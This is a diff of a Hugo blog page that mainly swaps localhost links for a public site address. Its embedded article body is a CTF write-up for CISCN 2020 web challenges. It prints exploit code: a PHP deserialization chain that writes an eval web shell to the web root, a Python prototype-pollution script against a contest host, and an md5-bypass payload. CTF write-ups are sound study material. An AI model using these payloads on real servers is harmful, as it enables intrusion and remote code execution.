@@ -1,26 +1,26 @@
 <!DOCTYPE html>
 <html lang="en" dir="auto">
 
-<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset="utf-8">
+<head><meta charset="utf-8">
 <meta http-equiv="X-UA-Compatible" content="IE=edge">
 <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
-<meta name="robots" content="noindex, nofollow">
+<meta name="robots" content="index, follow">
 <title>ciscn2020_online | ch3n9w の 超元域</title>
 <meta name="keywords" content="">
 <meta name="description" content="
 web越來越没有牌面了&hellip;国赛果然是pwn和misc的天下
 ">
 <meta name="author" content="ch3n9w">
-<link rel="canonical" href="//localhost:1313/posts/ctf-ciscn2020-online/">
+<link rel="canonical" href="http://ch3n9w.cpolar.cn/posts/ctf-ciscn2020-online/">
 <link crossorigin="anonymous" href="/assets/css/stylesheet.b609c58d5c11bb90b1a54e04005d74ad1ddf22165eb79f5533967e57df9c3b50.css" integrity="sha256-tgnFjVwRu5CxpU4EAF10rR3fIhZet59VM5Z&#43;V9&#43;cO1A=" rel="preload stylesheet" as="style">
-<link rel="icon" href="//localhost:1313/flash.ico">
-<link rel="icon" type="image/png" sizes="16x16" href="//localhost:1313/flash.ico">
-<link rel="icon" type="image/png" sizes="32x32" href="//localhost:1313/flash.ico">
-<link rel="apple-touch-icon" href="//localhost:1313/flash.ico">
-<link rel="mask-icon" href="//localhost:1313/flash.ico">
+<link rel="icon" href="http://ch3n9w.cpolar.cn/flash.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="http://ch3n9w.cpolar.cn/flash.ico">
+<link rel="icon" type="image/png" sizes="32x32" href="http://ch3n9w.cpolar.cn/flash.ico">
+<link rel="apple-touch-icon" href="http://ch3n9w.cpolar.cn/flash.ico">
+<link rel="mask-icon" href="http://ch3n9w.cpolar.cn/flash.ico">
 <meta name="theme-color" content="#2e2e33">
 <meta name="msapplication-TileColor" content="#2e2e33">
-<link rel="alternate" hreflang="en" href="//localhost:1313/posts/ctf-ciscn2020-online/">
+<link rel="alternate" hreflang="en" href="http://ch3n9w.cpolar.cn/posts/ctf-ciscn2020-online/">
 <noscript>
     <style>
         #theme-toggle,
@@ -57,7 +57,75 @@ web越來越没有牌面了&hellip;国赛果然是pwn和misc的天下
         }
 
     </style>
-</noscript>
+</noscript><meta property="og:title" content="ciscn2020_online" />
+<meta property="og:description" content="
+web越來越没有牌面了&hellip;国赛果然是pwn和misc的天下
+" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="http://ch3n9w.cpolar.cn/posts/ctf-ciscn2020-online/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2020-08-20T13:16:50+00:00" />
+<meta property="article:modified_time" content="2020-08-20T13:16:50+00:00" />
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="ciscn2020_online"/>
+<meta name="twitter:description" content="
+web越來越没有牌面了&hellip;国赛果然是pwn和misc的天下
+"/>
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [
+    {
+      "@type": "ListItem",
+      "position":  1 ,
+      "name": "Posts",
+      "item": "http://ch3n9w.cpolar.cn/posts/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  2 ,
+      "name": "ciscn2020_online",
+      "item": "http://ch3n9w.cpolar.cn/posts/ctf-ciscn2020-online/"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "ciscn2020_online",
+  "name": "ciscn2020_online",
+  "description": " web越來越没有牌面了\u0026hellip;国赛果然是pwn和misc的天下\n",
+  "keywords": [
+    
+  ],
+  "articleBody": " web越來越没有牌面了…国赛果然是pwn和misc的天下\neasyphp 要让子进程异常退出, 先打印出php的所有内置函数然后爆破发包发现这个函数可以让他异常退出\na=stream_socket_server babyunserialize 传入flag并对flag进行反序列化, 搜索__destruct函数后决定用jip.php\nfunction __destruct() { if ($this-\u003elazy) { $this-\u003elazy = FALSE; foreach ($this-\u003edata?:[] as $file =\u003e $data) $this-\u003ewrite($file,$data); } } function write($file,array $data=NULL) { if (!$this-\u003edir || $this-\u003elazy) return count($this-\u003edata[$file]=$data); $fw=\\Base::instance(); switch ($this-\u003eformat) { case self::FORMAT_JSON: $out=json_encode($data,JSON_PRETTY_PRINT); break; case self::FORMAT_Serialized: $out=$fw-\u003eserialize($data); break; } return $fw-\u003ewrite($this-\u003edir.$file,$out); } exp如下\n\u003c?php namespace DB{ class jig{ const FORMAT_JSON=1, FORMAT_Serialized=0; protected $dir; protected $data; protected $lazy; protected $format; public function __construct($dir,$data,$lazy) { $this-\u003edata = $data; $this-\u003edir = $dir; $this-\u003elazy = $lazy; $this-\u003eformat = 0; } } } namespace ddd{ $a = new \\DB\\jig(\"/var/www/html/\", [\"kkk.php\"=\u003e ['\u003c?php eval($_POST[1]);?\u003e']], True); echo urlencode(serialize($a)); } ?\u003e littlegame javascript原型链污染\n关键代码\nrouter.post(\"/DeveloperControlPanel\", function (req, res, next) { // not implement if (req.body.key === undefined || req.body.password === undefined){ res.send(\"What's your problem?\"); }else { let key = req.body.key.toString(); let password = req.body.password.toString(); if(Admin[key] === password){ res.send(process.env.flag); }else { res.send(\"Wrong password!Are you Admin?\"); } } }); router.get('/SpawnPoint', function (req, res, next) { req.session.knight = { \"HP\": 1000, \"Gold\": 10, \"Firepower\": 10 } res.send(\"Let's begin!\"); }); router.post(\"/Privilege\", function (req, res, next) { // Why not ask witch for help? if(req.session.knight === undefined){ res.redirect('/SpawnPoint'); }else{ if (req.body.NewAttributeKey === undefined || req.body.NewAttributeValue === undefined) { res.send(\"What's your problem?\"); }else { let key = req.body.NewAttributeKey.toString(); let value = req.body.NewAttributeValue.toString(); setFn(req.session.knight, key, value); res.send(\"Let's have a check!\"); } } }); 污染req.session.knight\nexp如下\nimport requests url = \"http://eci-2ze9505q64pi24hxhzqj.cloudeci1.ichunqiu.com:8888/\" data1 = { \"NewAttributeKey\":\"constructor.prototype.ch3n9w\", \"NewAttributeValue\":\"1234\" } data2 = { \"key\":'ch3n9w', 'password':'1234' } sess = requests.Session() sess.get(url+\"SpawnPoint\") sess.post(url+\"Privilege\",data=data1) r = sess.post(url+\"DeveloperControlPanel\",data=data2) print(r.text) rceme 搜索发现https://www.anquanke.com/post/id/212603#h2-0, 拿着payload直接打就可以了\neasytrick \u003c?php class trick{ public $trick1; public $trick2; public function __construct($a, $b) { $this-\u003etrick1 = $a; $this-\u003etrick2 = $b; } public function __destruct(){ $this-\u003etrick1 = (string)$this-\u003etrick1; if(strlen($this-\u003etrick1) \u003e 5 || strlen($this-\u003etrick2) \u003e 5){ die(\"你太长了\"); } if($this-\u003etrick1 !== $this-\u003etrick2 \u0026\u0026 md5($this-\u003etrick1) === md5($this-\u003etrick2) \u0026\u0026 $this-\u003etrick1 != $this-\u003etrick2){ echo file_get_contents(\"/flag\"); } } } $a = new trick(INF, INF); echo urlencode(serialize($a)); ",
+  "wordCount" : "306",
+  "inLanguage": "en",
+  "datePublished": "2020-08-20T13:16:50Z",
+  "dateModified": "2020-08-20T13:16:50Z",
+  "author":{
+    "@type": "Person",
+    "name": "ch3n9w"
+  },
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "http://ch3n9w.cpolar.cn/posts/ctf-ciscn2020-online/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "ch3n9w の 超元域",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "http://ch3n9w.cpolar.cn/flash.ico"
+    }
+  }
+}
+</script>
 </head>
 
 <body class="" id="top">
@@ -75,8 +143,8 @@ web越來越没有牌面了&hellip;国赛果然是pwn和misc的天下
 <header class="header">
     <nav class="nav">
         <div class="logo">
-            <a href="//localhost:1313/" accesskey="h" title="ch3n9w の 超元域 (Alt + H)">
-                <img src="//localhost:1313/sabito.jpg" alt="" aria-label="logo"
+            <a href="http://ch3n9w.cpolar.cn/" accesskey="h" title="ch3n9w の 超元域 (Alt + H)">
+                <img src="http://ch3n9w.cpolar.cn/sabito.jpg" alt="" aria-label="logo"
                     height="35">ch3n9w の 超元域</a>
             <div class="logo-switches">
                 <button id="theme-toggle" accesskey="t" title="(Alt + T)">
@@ -103,7 +171,7 @@ web越來越没有牌面了&hellip;国赛果然是pwn和misc的天下
         </div>
         <ul id="menu">
             <li>
-                <a href="//localhost:1313/categories/" title="categories">
+                <a href="http://ch3n9w.cpolar.cn/categories/" title="categories">
                     <span>categories</span>
                 </a>
             </li>
@@ -114,7 +182,7 @@ web越來越没有牌面了&hellip;国赛果然是pwn和misc的天下
 
 <article class="post-single">
   <header class="post-header">
-    <div class="breadcrumbs"><a href="//localhost:1313/">Home</a>&nbsp;»&nbsp;<a href="//localhost:1313/posts/">Posts</a></div>
+    <div class="breadcrumbs"><a href="http://ch3n9w.cpolar.cn/">Home</a>&nbsp;»&nbsp;<a href="http://ch3n9w.cpolar.cn/posts/">Posts</a></div>
     <h1 class="post-title entry-hint-parent">
       ciscn2020_online
     </h1>
@@ -294,12 +362,12 @@ web越來越没有牌面了&hellip;国赛果然是pwn和misc的天下
     <ul class="post-tags">
     </ul>
 <nav class="paginav">
-  <a class="prev" href="//localhost:1313/posts/sec-http-smuggling/">
+  <a class="prev" href="http://ch3n9w.cpolar.cn/posts/sec-http-smuggling/">
     <span class="title">« Prev</span>
     <br>
     <span>http请求走私笔记</span>
   </a>
-  <a class="next" href="//localhost:1313/posts/ctf-%E7%BD%91%E9%BC%8E%E6%9D%AF2020/">
+  <a class="next" href="http://ch3n9w.cpolar.cn/posts/ctf-%E7%BD%91%E9%BC%8E%E6%9D%AF2020/">
     <span class="title">Next »</span>
     <br>
     <span>网鼎杯2020 web</span>
@@ -311,7 +379,7 @@ web越來越没有牌面了&hellip;国赛果然是pwn和misc的天下
     </main>
     
 <footer class="footer">
-    <span>&copy; 2024 <a href="//localhost:1313/">ch3n9w の 超元域</a></span>
+    <span>&copy; 2024 <a href="http://ch3n9w.cpolar.cn/">ch3n9w の 超元域</a></span>
     <span>
         Powered by
         <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
